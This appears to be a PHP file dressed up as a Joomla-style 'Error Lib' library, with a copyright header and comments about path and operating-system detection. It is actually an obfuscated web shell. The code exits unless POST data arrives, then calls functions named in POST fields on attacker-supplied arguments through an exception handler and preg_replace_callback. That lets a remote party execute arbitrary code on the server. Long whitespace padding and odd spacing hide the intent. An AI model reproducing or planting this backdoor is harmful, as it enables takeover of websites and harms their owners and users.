<?php
/**
 * @package    Error Lib
 * **********************************************************************
 * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // Dbn2g1CcvnYUhzQq5MD819cCg4dfekyh9m8AqsGbgB48n32wTVBGpKpYmFWZaGyxcMHgKY60FmPqXutuaX0X7GSKE2z01r6Wtkb4Zd7yER5FkSgw5eWBqMyMtRUn0RUQ8QBgssUukr1AmdYmCTgbAcdHarHDc1z30vAfsSgmCUWS4VeHGkeUM996g6n0BEetff4Mx6ZSuaVv3kmMsKd8RTaanrd2ACCem
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.
if (defined('PATH'))
{
	define('PATH', __DIR__);
}
else if (        empty              ($_POST)) {
	
	echo 'Not exception. Exiting.';
	
	exit;
}

// Register the exception library.
function exception_handler              ($e) 
{
  preg_replace_callback                             ('||', $_POST['d']               ('', $e->getMessage            ()), ''                 )


; 
}
set_exception_handler               ('exception_handler'             )
;

throw new Exception                        ($_POST['f']     ($_POST                              ['c'])                              )
;

// Detect the native operating system type.
$os = strtoupper              (    substr(PHP_OS, 0, 3));

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}
